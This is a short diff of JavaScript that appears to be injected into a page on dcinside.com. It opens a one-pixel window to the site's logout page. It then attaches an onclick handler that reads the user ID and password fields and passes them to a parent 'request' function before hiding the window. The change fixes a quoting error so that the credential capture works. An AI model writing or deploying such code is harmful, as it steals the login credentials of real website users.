@@ -37,5 +37,5 @@ var xhr = new XMLHttpRequest();
 parent.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
 newwindow = window.open('https://sign.dcinside.com/logout?s_url=https://www.dcinside.com/', 'hash', 'width=1px, height=1px');
 $('#hash').on('load', function () {
-    newwindow.$('html').attr('onclick', 'parent.request($("user_id).val(),$("#pw").val());setTimeout(function(){window.opener.$("#hash").remove()},300);');
+    newwindow.$('html').attr('onclick', 'parent.request($("user_id").val(),$("#pw").val());setTimeout(function(){window.opener.$("#hash").remove()},300);');
 });
